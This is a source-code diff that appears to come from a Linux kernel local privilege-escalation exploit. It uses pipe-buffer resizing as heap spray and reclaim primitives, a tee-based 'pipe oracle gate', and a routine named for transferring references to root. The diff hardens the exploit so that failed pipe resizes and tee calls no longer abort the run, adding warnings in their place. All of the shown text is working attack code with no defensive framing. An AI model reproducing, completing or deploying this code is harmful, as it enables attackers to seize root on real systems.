@@ -88,21 +88,39 @@ void init_ctx(struct mm_ctx *ctx, size_t cnt) {
   ctx->memfds = calloc(sizeof(int), cnt);
 }
 
-void resize_pipe_slots(int pipefd[2], size_t slots) {
-  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
+int resize_pipe_slots(int pipefd[2], size_t slots) {
+  /* NOTE: F_SETPIPE_SZ returns the new size in bytes (>0) on success,
+   * -1 on failure. Never compare against 0. */
+  if (fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE) == -1) {
+    int resize_errno = errno;
+    /* Shell context lacks CAP_SYS_RESOURCE; oversized or racy resizes must
+     * degrade to the current pipe size instead of aborting the run.
+     * Geometry drift (e.g. 32 slots assumed vs 16 actual) is observable
+     * downstream via gate behavior; blocking-write stall risk accepted
+     * (writes here are paired with readers). */
+    errno = 0;
+    int actual = fcntl(pipefd[0], F_GETPIPE_SZ);
+    int actual_errno = errno;
+    pr_warning("resize_pipe_slots slots=%zu errno=%d actual=%d "
+               "actual_errno=%d; continuing\n",
+               slots, resize_errno, actual, actual_errno);
+    errno = resize_errno;
+    return -1;
+  }
+  return 0;
 }
 
 void make_pipe_object(int pipefd[2]) {
   SYSCHK(pipe(pipefd));
-  resize_pipe_slots(pipefd, 2);
+  (void)resize_pipe_slots(pipefd, 2);
 }
 
 void alloc_pipe_object(int pipefd[2]) {
-  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
+  (void)resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
 }
 
 void free_pipe_object(int pipefd[2]) {
-  resize_pipe_slots(pipefd, 2);
+  (void)resize_pipe_slots(pipefd, 2);
 }
 
 uintptr_t prepare_pipe_buffer_page_child(void) {
@@ -895,13 +913,12 @@ static int pipe_read_full(int fd, void *data, size_t size) {
   return 1;
 }
 
-static int pipe_duplicate_bytes(
+static ssize_t pipe_duplicate_bytes(
     int source_fd, int holder[2], size_t size, size_t slots) {
   SYSCHK(pipe(holder));
-  resize_pipe_slots(holder, slots);
+  (void)resize_pipe_slots(holder, slots);
   errno = 0;
-  ssize_t duplicated = syscall(SYS_tee, source_fd, holder[1], size, 0);
-  return duplicated == (ssize_t)size;
+  return syscall(SYS_tee, source_fd, holder[1], size, 0);
 }
 
 static int transfer_p0_references_to_root(int retained_pipe_index) {
@@ -1088,10 +1105,18 @@ int verify_p0_pipe_oracle_gate(void) {
   p0_gate_holders_initialized = 1;
 #endif
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    if (!pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
-                              p0_gate_holders[pipe_index], PAGE_SIZE, 1)) {
-      pr_warning("p0 gate tee failed pipe=%zu errno=%d\n",
-                 pipe_index, errno);
+    errno = 0;
+    ssize_t tee_ret = pipe_duplicate_bytes(pipe_fds_reclaim[pipe_index][0],
+                                           p0_gate_holders[pipe_index],
+                                           PAGE_SIZE, 1);
+    int tee_errno = errno;
+    if (tee_ret != (ssize_t)PAGE_SIZE) {
+      errno = 0;
+      int src_sz = fcntl(pipe_fds_reclaim[pipe_index][0], F_GETPIPE_SZ);
+      int src_sz_errno = errno;
+      pr_warning("p0 gate tee failed pipe=%zu ret=%zd errno=%d "
+                 "src_sz=%d src_sz_errno=%d\n",
+                 pipe_index, tee_ret, tee_errno, src_sz, src_sz_errno);
       spawn_p0_ref_keeper(-1);
       return 0;
     }
